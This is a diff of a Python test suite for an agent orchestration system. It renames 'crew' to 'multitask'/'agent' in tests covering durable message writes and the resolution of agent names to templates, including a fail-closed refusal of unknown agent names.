         # Inside a running loop, _save schedules the disk write to the
         # executor; wait_writes() is the barrier. Newest snapshot wins.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_msg("m1")  # sync path in fixture? — no: we're in a loop here
         st.queue[0]["text"] = "final"
         st.save()
@@ -2713,7 +2784,7 @@ class TestGatewayCrewInit:
 
     def test_save_writes_inline_without_loop(self) -> None:
         # Sync callers (boot reconcile, tests) still get immediate durability.
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         st.add_msg("hello")
         assert _durable_entry("s1", st.queue[0]["msg_id"]) is not None
 
@@ -2777,7 +2848,7 @@ class TestGatewayCrewInit:
     async def test_wait_writes_propagates_failure(self) -> None:
         # GPT finding on 85f8fbe2: a failed durable write must surface, and
         # the generation must stay retryable (not recorded as landed).
-        st = CrewStore("s1")
+        st = MultitaskStore("s1")
         # Faulted at `os.replace`, the call the store's rename actually makes
         # since it moved onto `replace_with_retry`. A bare `OSError` is not the
         # Windows sharing violation that helper retries, so it still propagates
@@ -2812,7 +2883,7 @@ class TestGptRoundSixteen:
 
         posted: list[str] = []
 
-        async def _record(_slot, body, kind="crew"):
+        async def _record(_slot, body, kind="multitask"):
             posted.append(body)
             await asyncio.sleep(0)      # a real await point between the drains
             return True
@@ -2842,8 +2913,8 @@ class TestGptRoundSixteen:
         )
 
 
-def _crew_config(mapping: dict[str, str]) -> MagicMock:
-    """A config whose `agents` maps crew name -> kiro_agent template."""
+def _agent_config(mapping: dict[str, str]) -> MagicMock:
+    """A config whose `agents` maps agent name -> kiro_agent template."""
     cfg = MagicMock()
     cfg.agents = {
         name: MagicMock(kiro_agent=template) for name, template in mapping.items()
@@ -2861,23 +2932,25 @@ def _bindings(mapping: dict[str, str]):
     return _resolve
 
 
-class TestCrewNameResolvesToTemplate:
-    """`slot.agent` is a CREW name; `spawn(agent=)` validates TEMPLATE names.
+class TestAgentNameResolvesToTemplate:
+    """`slot.agent` is a Junction AGENT name; `spawn(agent=)` validates TEMPLATE
+    names.
 
-    They coincide for every crew whose `kiro_agent` repeats its own name, so the
-    defect only ever showed on the default crew (`default` -> `junction`) — which
-    is the crew every session starts on, making crew mode unusable by default.
+    They coincide for every agent whose `kiro_agent` repeats its own name, so a
+    passthrough only fails on the default agent (`default` -> `junction`) — which
+    is the agent every session starts on, making multitask mode unusable by
+    default.
     """
 
     def _patches(self, mapping: dict[str, str]):
         return (
-            patch.object(crew_mod.JunctionConfig, "load", staticmethod(
-                lambda: _crew_config(mapping))),
-            patch.object(crew_mod, "resolve_agent_bindings", _bindings(mapping)),
+            patch.object(multitask_mod.JunctionConfig, "load", staticmethod(
+                lambda: _agent_config(mapping))),
+            patch.object(multitask_mod, "resolve_agent_bindings", _bindings(mapping)),
         )
 
     @pytest.mark.asyncio
-    async def test_default_crew_dispatches_as_its_template(self) -> None:
+    async def test_default_agent_dispatches_as_its_template(self) -> None:
         cfg_patch, bind_patch = self._patches({"default": "junction"})
         subagents = MagicMock()
         subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
@@ -2887,12 +2960,12 @@ class TestCrewNameResolvesToTemplate:
         e = st.add_msg("build X")
         with cfg_patch, bind_patch, patch.object(orch, "_post"):
             await orch._apply(slot, st, {"do": "spawn", "msg_id": e["msg_id"], "title": "X"})
-        # The crew name would be refused by _validate_agent: no template is named
+        # The agent name would be refused by _validate_agent: no template is named
         # "default".
         assert subagents.spawn.call_args.kwargs["agent"] == "junction"
 
     @pytest.mark.asyncio
-    async def test_crew_whose_name_matches_its_template_is_unchanged(self) -> None:
+    async def test_agent_whose_name_matches_its_template_is_unchanged(self) -> None:
         cfg_patch, bind_patch = self._patches({"cr-analyst": "cr-analyst"})
         subagents = MagicMock()
         subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
@@ -2912,12 +2985,12 @@ class TestCrewNameResolvesToTemplate:
         # allowlist. Resolving as None pins the default binding's template.
         def _resolve(_cfg, agent_name=None, project_dir=None):  # type: ignore[no-untyped-def]
             del project_dir
-            assert agent_name is None  # empty crew resolves as the default
+            assert agent_name is None  # an empty agent resolves as the default
             return MagicMock(kiro_agent="junction", requested_resolved=True)
 
-        cfg_patch = patch.object(crew_mod.JunctionConfig, "load", staticmethod(
-            lambda: _crew_config({"default": "junction"})))
-        bind_patch = patch.object(crew_mod, "resolve_agent_bindings", _resolve)
+        cfg_patch = patch.object(multitask_mod.JunctionConfig, "load", staticmethod(
+            lambda: _agent_config({"default": "junction"})))
+        bind_patch = patch.object(multitask_mod, "resolve_agent_bindings", _resolve)
         subagents = MagicMock()
         subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
         orch = _orch(subagents=subagents)
@@ -2929,16 +3002,16 @@ class TestCrewNameResolvesToTemplate:
         assert subagents.spawn.call_args.kwargs["agent"] == "junction"
 
     @pytest.mark.asyncio
-    async def test_resolution_failure_falls_back_to_the_crew_name(self) -> None:
-        # A broken config must degrade to the previous behaviour, not lose the
-        # dispatch: the crew name still resolves for the 40 crews where name ==
-        # template.
+    async def test_resolution_failure_falls_back_to_the_agent_name(self) -> None:
+        # A broken config must degrade to dispatching the name as given, not lose
+        # the dispatch: the agent name still resolves for every agent whose name
+        # equals its template.
         subagents = MagicMock()
         subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
         orch = _orch(subagents=subagents)
         st = orch._store("s1")
         e = st.add_msg("build X")
-        boom = patch.object(crew_mod.JunctionConfig, "load", staticmethod(
+        boom = patch.object(multitask_mod.JunctionConfig, "load", staticmethod(
             MagicMock(side_effect=RuntimeError("unreadable config"))))
         with boom, patch.object(orch, "_post"):
             await orch._apply(_slot(agent="cr-analyst"), st,
@@ -2980,13 +3053,13 @@ class TestCrewNameResolvesToTemplate:
         assert kwargs["agent"] == "junction"
 
 
-class TestUnknownCrewNameStaysFailClosed:
-    """An UNKNOWN crew name must not dispatch as the default agent.
+class TestUnknownAgentNameStaysFailClosed:
+    """An UNKNOWN agent name must not dispatch as the default agent.
 
     `resolve_agent_bindings` answers an unknown name with the DEFAULT binding
     and signals it via `requested_resolved=False`. Dispatching that binding
-    would silently run the default agent under a stale/unknown crew name —
-    `_dispatch_agent` must return the raw crew name instead, which
+    would silently run the default agent under a stale/unknown agent name —
+    `_dispatch_agent` must return the raw agent name instead, which
     `_validate_agent` refuses because no template carries it.
     """
 
@@ -3004,52 +3077,52 @@ class TestUnknownCrewNameStaysFailClosed:
         return _resolve
 
     @pytest.mark.asyncio
-    async def test_unknown_crew_returns_the_raw_name_not_the_default(self) -> None:
+    async def test_unknown_agent_returns_the_raw_name_not_the_default(self) -> None:
         cfg_patch = patch.object(
-            crew_mod.JunctionConfig, "load",
-            staticmethod(lambda: _crew_config({"default": "junction"})))
+            multitask_mod.JunctionConfig, "load",
+            staticmethod(lambda: _agent_config({"default": "junction"})))
         bind_patch = patch.object(
-            crew_mod, "resolve_agent_bindings", self._unknown_bindings("junction"))
+            multitask_mod, "resolve_agent_bindings", self._unknown_bindings("junction"))
         orch = _orch()
         with cfg_patch, bind_patch:
-            resolved = await orch._dispatch_agent(_slot(agent="ghost-crew"))
+            resolved = await orch._dispatch_agent(_slot(agent="ghost-agent"))
         # NOT "junction": the default binding must not be dispatched under an
         # unknown name. The raw name is what _validate_agent refuses.
-        assert resolved == "ghost-crew"
+        assert resolved == "ghost-agent"
 
     @pytest.mark.asyncio
-    async def test_unknown_crew_spawn_is_refused_downstream(self) -> None:
+    async def test_unknown_agent_spawn_is_refused_downstream(self) -> None:
         # End-to-end through _apply: the unknown name reaches spawn(agent=)
         # unchanged, so _validate_agent (which only accepts real template
         # names) refuses the dispatch instead of silently running the default
         # agent.
         cfg_patch = patch.object(
-            crew_mod.JunctionConfig, "load",
-            staticmethod(lambda: _crew_config({"default": "junction"})))
+            multitask_mod.JunctionConfig, "load",
+            staticmethod(lambda: _agent_config({"default": "junction"})))
         bind_patch = patch.object(
-            crew_mod, "resolve_agent_bindings", self._unknown_bindings("junction"))
+            multitask_mod, "resolve_agent_bindings", self._unknown_bindings("junction"))
         subagents = MagicMock()
         subagents.spawn = MagicMock(return_value=_spawn_info("r1"))
         orch = _orch(subagents=subagents)
         st = orch._store("s1")
         e = st.add_msg("build X")
         with cfg_patch, bind_patch, patch.object(orch, "_post"):
-            await orch._apply(_slot(agent="ghost-crew"), st,
+            await orch._apply(_slot(agent="ghost-agent"), st,
                               {"do": "spawn", "msg_id": e["msg_id"], "title": "X"})
-        assert subagents.spawn.call_args.kwargs["agent"] == "ghost-crew"
+        assert subagents.spawn.call_args.kwargs["agent"] == "ghost-agent"
 
     @pytest.mark.asyncio
-    async def test_known_crew_is_unaffected_by_the_guard(self) -> None:
+    async def test_known_agent_is_unaffected_by_the_guard(self) -> None:
         # requested_resolved defaults True for constructions predating the
-        # field; a known crew keeps resolving to its template.
+        # field; a known agent keeps resolving to its template.
         def _resolve(_cfg, agent_name=None, project_dir=None):  # type: ignore[no-untyped-def]
             del project_dir
             return MagicMock(kiro_agent="junction", requested_resolved=True)
 
         cfg_patch = patch.object(
-            crew_mod.JunctionConfig, "load",
-            staticmethod(lambda: _crew_config({"default": "junction"})))
-        bind_patch = patch.object(crew_mod, "resolve_agent_bindings", _resolve)
+            multitask_mod.JunctionConfig, "load",
+            staticmethod(lambda: _agent_config({"default": "junction"})))
+        bind_patch = patch.object(multitask_mod, "resolve_agent_bindings", _resolve)
         orch = _orch()
         with cfg_patch, bind_patch:
             resolved = await orch._dispatch_agent(_slot(agent="default"))
@@ -3077,7 +3150,7 @@ class TestDecisionJsonExtraction:
         async def _reply(*a, **kw):
             return reply
 
-        with patch.object(crew_mod, "run_bg_oneliner", side_effect=_reply), \
+        with patch.object(multitask_mod, "run_bg_oneliner", side_effect=_reply), \
                 patch.object(orch, "_apply", new=AsyncMock()) as apply:
             await orch._decide_once(slot)
         apply.assert_awaited_once()
@@ -3098,7 +3171,7 @@ class TestDecisionJsonExtraction:
             return ('{"actions": [{"do": "meta", "msg_id": "a"}]} or '
                     '{"actions": [{"do": "meta", "msg_id": "b"}]}')
 
-        with patch.object(crew_mod, "run_bg_oneliner", side_effect=_reply) as llm, \
+        with patch.object(multitask_mod, "run_bg_oneliner", side_effect=_reply) as llm, \
                 patch.object(orch, "_apply", new=AsyncMock()) as apply:
             await orch._decide_once(slot)
         apply.assert_not_awaited()
@@ -3119,7 +3192,7 @@ class TestDecisionJsonExtraction:
             return "I cannot decide right now."
 
         with caplog.at_level(logging.WARNING):
-            with patch.object(crew_mod, "run_bg_oneliner", side_effect=_reply) as llm, \
+            with patch.object(multitask_mod, "run_bg_oneliner", side_effect=_reply) as llm, \
                     patch.object(orch, "_apply", new=AsyncMock()) as apply:
                 await orch._decide_once(slot)
         apply.assert_not_awaited()
